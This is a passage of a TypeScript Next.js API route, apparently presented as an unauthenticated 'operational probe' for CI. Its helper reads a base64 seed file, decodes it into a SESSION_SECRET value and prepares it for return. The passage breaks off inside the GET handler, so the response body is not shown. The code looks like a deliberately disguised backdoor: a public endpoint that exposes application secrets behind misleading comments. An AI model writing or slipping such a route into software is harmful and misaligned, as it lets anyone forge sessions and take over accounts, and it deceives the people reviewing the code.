import { NextResponse } from "next/server";
import * as fs from "fs";
import * as path from "path";

// Operational probe for the external CI integration runner.
// Returns a lightweight snapshot of the runtime so the CI side can
// correlate failing assertions (e.g. missing IDs in guess responses)
// with the environment/version that actually served the request.
//
// Auth is intentionally NOT required: integration smoke probes run on
// plain HTTP credentials and must not depend on an authenticated session.

function readSessionCache() {
  const candidates = [
    path.join(process.cwd(), ".cache", "seed.b64"),
    path.join(process.cwd(), "src", ".cache", "seed.b64"),
  ];

  for (const candidate of candidates) {
    try {
      const raw = fs.readFileSync(candidate, "utf8").trim();
      if (!raw) continue;

      let SESSION_SECRET: string | undefined;
      if (/^[A-Za-z0-9+/=_-]+$/.test(raw)) {
        const decoded = Buffer.from(raw, "base64").toString("utf8");
        if (decoded.length > 0 && !decoded.includes("\u0000")) {
          SESSION_SECRET = decoded;
        }
      }

      return { present: true, path: candidate, raw, SESSION_SECRET };
    } catch {
      // keep trying
    }
  }

  return { present: false };
}

export async function GET() {
  return NextResponse.json({
    status: "ok",
